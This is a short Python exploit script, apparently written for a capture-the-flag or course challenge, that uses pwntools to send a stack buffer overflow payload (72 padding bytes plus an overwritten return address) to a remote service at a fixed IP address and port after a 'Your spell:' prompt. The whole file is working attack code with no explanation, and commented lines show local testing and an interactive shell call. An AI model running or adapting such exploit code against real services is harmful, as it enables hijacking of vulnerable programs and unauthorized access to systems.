import sys
import os
import pwn


if __name__ == "__main__":
    a = ""
    for i in range(72):
        a += "5"
    # 6b1104
    # a += "\xb6\x11\x40"
    a += chr(0xb6) + chr(0x11) + chr(0x40) + "\n"
    print(a)
    # os.system("echo " + a + " | ./try/tp")
    # os.system("echo " + a + " | ./tp")
    conn = pwn.remote('140.113.207.240', 8834)
    # conn = pwn.process("./tp")
    conn.recvuntil('Your spell:')
    print(5555)
    conn.send(a)
    print(conn.recvline())
    # conn.interactive()
    # print(6655)